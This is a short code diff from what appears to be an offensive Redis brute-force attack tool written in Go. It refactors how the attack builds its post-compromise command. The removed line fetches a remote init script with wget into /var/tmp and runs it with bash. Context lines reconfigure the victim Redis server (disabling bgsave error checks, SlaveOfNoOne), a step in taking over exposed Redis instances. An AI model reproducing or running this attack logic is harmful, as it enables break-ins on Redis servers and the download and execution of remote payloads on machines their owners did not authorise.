@@ -125,9 +125,9 @@ func (rba *RedisBruteforceAttack) doAttack(redisClient *redis.RedisClient, ip st
 
 	var ap *attack.AttackProcess
 
-	initUrl := rba.attackTasks.DownloadInitUrl(ip, port, RedisBruteForceAttackType, "init.sh.tpl")
+	initUrl := rba.attackTasks.DownloadInitUrl(ip, port, RedisBruteForceAttackType, "init.sh")
 
-	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh.tpl;bash /var/tmp/init.sh.tpl", initUrl)
+	cmd := rba.attackTasks.InitCmdForLinux(initUrl)
 
 	redisClient.ConfigSet("stop-writes-on-bgsave-error", "no")
 	redisClient.SlaveOfNoOne()
